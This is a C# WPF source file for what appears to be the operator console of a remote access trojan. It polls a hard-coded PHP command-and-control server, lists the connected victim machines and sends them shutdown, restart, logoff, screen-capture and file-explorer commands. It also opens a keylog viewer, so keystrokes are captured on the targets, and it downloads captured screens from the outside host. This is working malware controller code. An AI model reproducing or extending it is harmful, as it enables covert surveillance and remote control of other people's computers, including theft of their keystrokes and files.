using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace Control
{
    /// <summary>
    /// Window1.xaml の相互作用ロジック
    /// </summary>
    public partial class MainWindow : Window
    {
        int userID = 1;
        int sessionID;
        int touserid = 11;
        ChatWindow chatWindow;
        FileExplorerWindow fileExplorerWindow;

        delegate void t();

        public MainWindow()
        {
            InitializeComponent();

            chatWindow = new ChatWindow((mess) =>
            {
                Tools.sendCommand("mess " + mess, touserid, sessionID);
            });

            getListUser();
            DispatcherTimer dispatcherTimer = new DispatcherTimer();
            dispatcherTimer.Tick += new EventHandler(timer_Tick);
            dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
            dispatcherTimer.Start();
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            string[] cmds = getCommand();

            foreach (string cmd in cmds)
            {
                if (cmd != null && cmd != "")
                {
                    cmdProc(cmd);
                }
            }
        }

        private void cmdProc(string cmd)
        {
            if (cmd.ToUpper().StartsWith("MESS"))
            {

                chatWindow.txtChatBox.AppendText("CLIENT: " + cmd.Substring(5) + Environment.NewLine);
                chatWindow.txtChatBox.ScrollToEnd();
            }
            else if (cmd.ToUpper().StartsWith("FILEEXPLORER"))
            {
                if (fileExplorerWindow != null) fileExplorerWindow.update(cmd.Substring(13).Replace(';', '\\'));

            }
            else if (cmd.ToUpper().StartsWith("MBOX"))
            {
                MessageBox.Show(cmd.Substring(5));
            }
            else if (cmd.ToUpper().StartsWith("VIEWSCREEN"))
            {
                new Thread(() =>
                {
                    using (var client = new WebClient())
                    {
                        //client.DownloadProgressChanged += wc_DownloadProgressChanged;
                        //client.DownloadFileAsync(new System.Uri("http://akita123.atwebpages.com/folder/ab.rar"), "ab.jpg");
                        client.DownloadFile("http://akita123.atwebpages.com/folder/ab.rar", "ab.jpg");
                        System.Diagnostics.Process.Start("ab.jpg");


                        t xt = () => { prbViewScreen.IsIndeterminate = false; };
                        prbViewScreen.Dispatcher.Invoke(DispatcherPriority.Normal, xt);


                    }
                }).Start();
            }
        }

        //void wc_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        //{
        //    prbViewScreen.Value = e.ProgressPercentage;
        //}

        private string[] getCommand()
        {
            string responseFromServer = Tools.request("http://akita123.atwebpages.com/main.php?type=3&ssid=" + sessionID + "&touserid=" + userID);

            string[] sep = { "</br>" };

            return responseFromServer.Split(sep, StringSplitOptions.None);
        }

        private void getListUser()
        {
            cbbListUser.Items.Clear();

            string[] sep = { "</br>" };
            string[] users = Tools.request("http://akita123.atwebpages.com/main.php?type=6").Split(sep, StringSplitOptions.None);

            foreach (string user in users)
            {
                if (user != null && user != "1" && user != "")
                {
                    cbbListUser.Items.Add(user);
                }
            }

            if (cbbListUser.Items.Count > 0)
            {
                cbbListUser.SelectedIndex = 0;
            }
        }

        private int getSessionID(int touserid)
        {
            string url = "http://akita123.atwebpages.com/main.php?type=4&userid=" + touserid;
            return int.Parse(Tools.request(url));
        }

        private void refreshSessionID(int touserid)
        {
            sessionID = getSessionID(touserid);

            txtSessionID.Text = "SessionID: " + sessionID;
        }

        private void cbbListUser_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (cbbListUser.SelectedItem != null)
            {
                touserid = int.Parse(cbbListUser.SelectedItem.ToString());
                refreshSessionID(touserid);
            }
        }

        private void btnRefreshListUser_Click(object sender, RoutedEventArgs e)
        {
            getListUser();
        }

        private void btnRefreshSSID_Click(object sender, RoutedEventArgs e)
        {
            refreshSessionID(touserid);
        }

        private void btnChat_Click(object sender, RoutedEventArgs e)
        {
            chatWindow.Show();
        }

        private void btnShutdown_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("shutdown", touserid, sessionID);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            chatWindow.Close();
            Environment.Exit(0);
        }

        private void btnViewKeyLog_Click(object sender, RoutedEventArgs e)
        {
            ViewKeyLogWindow viewKeyLogWindow = new ViewKeyLogWindow(touserid, sessionID);
            viewKeyLogWindow.Show();
        }

        private void btnFileExplorer_Click(object sender, RoutedEventArgs e)
        {
            fileExplorerWindow = new FileExplorerWindow(touserid, sessionID);
            fileExplorerWindow.Show();
        }

        private void btnViewScreen_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("viewscreen", touserid, sessionID);
            prbViewScreen.IsIndeterminate = true;
        }

        private void btnRestart_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("restart", touserid, sessionID);
        }

        private void btnLogoff_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("logoff", touserid, sessionID);
        }
    }
}
